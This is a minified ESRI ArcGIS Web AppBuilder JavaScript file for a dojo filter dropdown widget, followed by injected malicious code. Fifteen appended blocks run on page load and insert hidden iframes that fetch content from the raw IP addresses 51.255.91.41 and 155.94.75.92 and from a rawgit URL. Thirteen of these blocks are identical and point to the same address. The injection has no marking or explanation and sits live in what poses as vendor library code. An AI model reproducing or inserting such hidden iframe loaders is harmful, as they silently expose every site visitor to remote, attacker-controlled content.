// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/_filter/ListValueProvider.html":'\x3cdiv\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"valuesSelect" data-dojo-type\x3d"dijit/form/FilteringSelect" data-dojo-props\x3d\'searchAttr:"label",required:false,intermediateChanges:true\' style\x3d"width:100%;" data-dojo-attach-event\x3d"input:_onFilteringSelectInput"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/aspect dojo/Deferred dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare ./ValueProvider dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./ListValueProvider.html dojo/store/Memory jimu/utils dijit/form/FilteringSelect".split(" "),function(k,h,e,f,g,l,m,n,p,q,r,t){return l([m,n,p],{templateString:q,codedValues:null,staticValues:null,showNullValues:!1,postCreate:function(){this.inherited(arguments);f.addClass(this.domNode,"jimu-filter-list-value-provider");
this._uniqueValueCache={};var b=new r({idProperty:"id",data:[]});this.valuesSelect.set("store",b);this.staticValues||"function"!==typeof this.valuesSelect._onDropDownMouseDown||(!this.codedValues||this.codedValues&&this.filterCodedValue)&&this.own(k.before(this.valuesSelect,"_onDropDownMouseDown",e.hitch(this,this._onBeforeDropDownMouseDown)))},_onFilteringSelectInput:function(){this.emit("change")},_onBeforeDropDownMouseDown:function(){this._tryUpdatingUniqueValues(void 0,!0);return arguments},getDijits:function(){return[this.valuesSelect]},
setValueObject:function(b){return this.staticValues?this._setValueForStaticValues(b.value,this.staticValues):this.codedValues?this.filterCodedValue?this._tryUpdatingUniqueValues(b.value,!1):this._setValueForStaticValues(b.value,this.codedValues):this._tryUpdatingUniqueValues(b.value,!1)},getValueObject:function(){if(this.isValidValue()){var b=this.valuesSelect.get("item").value;return{isValid:!0,type:this.partObj.valueObj.type,value:b}}return null},tryGetValueObject:function(){return this.isValidValue()?
this.getValueObject():this.isEmptyValue()?{isValid:!0,type:this.partObj.valueObj.type,value:"string"===this.shortType?"":null}:null},setRequired:function(b){this.valuesSelect.set("required",b)},_setValueForStaticValues:function(b,c){var a=null,d=-1,a=null;c&&(a=g.map(c,e.hitch(this,function(a,c){a={id:c,value:a.value,label:a.label};a.value===b&&(d=c);return a})),this.valuesSelect.store.setData(a),0<=d&&(a=this.valuesSelect.store.get(d))&&this.valuesSelect.set("item",a))},_uniqueValueLoadingDef:null,
_uniqueValueLoadingExpr:"",_uniqueValueCache:null,_tryUpdatingUniqueValues:function(b,c){var a=new h;if(this.valuesSelect._opened)a.resolve();else{var d=this.getDropdownFilterExpr();d!==this._uniqueValueLoadingExpr?(this.valuesSelect.readOnly=!0,this._uniqueValueLoadingDef&&(this._uniqueValueLoadingDef.reject(),this._uniqueValueLoadingDef=null),this._uniqueValueLoadingExpr=d,this._uniqueValueLoadingDef=this._getUniqueValues(d),this._uniqueValueLoadingDef.then(e.hitch(this,function(u){this.domNode&&
(this._uniqueValueLoadingDef=null,this.valuesSelect.readOnly=!1,this._setValueForUniqueValues(b,u),this._hideLoadingIcon(),c&&this.valuesSelect.toggleDropDown(),a.resolve())}),e.hitch(this,function(b){console.error(b);this.domNode&&(this._uniqueValueLoadingDef=null,this.valuesSelect.readOnly=!1,this._hideLoadingIcon(),a.reject(b))}))):a.resolve()}return a},_setValueForUniqueValues:function(b,c){c.sort(function(a,b){return a.value<b.value?-1:a.value===b.value?0:1});this.showNullValues||(c=g.filter(c,
e.hitch(this,function(a){return"\x3cNull\x3e"!==a.value&&null!==a.value})));if(void 0===b){var a=this.getValueObject();a&&(b=a.value)}var d=-1,a=null;c=g.map(c,e.hitch(this,function(a,c){var e={id:c,value:a.value,label:a.label};a.value===b&&(d=c);return e}));this.valuesSelect.store.setData(c);0<=d&&(a=this.valuesSelect.store.get(d));this.valuesSelect.set("item",a)},_showLoadingIcon:function(){f.addClass(this.valuesSelect.domNode,"loading")},_hideLoadingIcon:function(){f.removeClass(this.valuesSelect.domNode,
"loading")},_getUniqueValues:function(b){var c=new h;this._uniqueValueCache[b]?c.resolve(this._uniqueValueCache[b]):(this._showLoadingIcon(),t.getUniqueValues(this.url,this.fieldName,b,this.layerDefinition,this.fieldPopupInfo).then(e.hitch(this,function(a){this.domNode&&(this._uniqueValueCache[b]=a,c.resolve(a),this._hideLoadingIcon())}),e.hitch(this,function(a){this.domNode&&(c.reject(a),this._hideLoadingIcon())})));return c}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});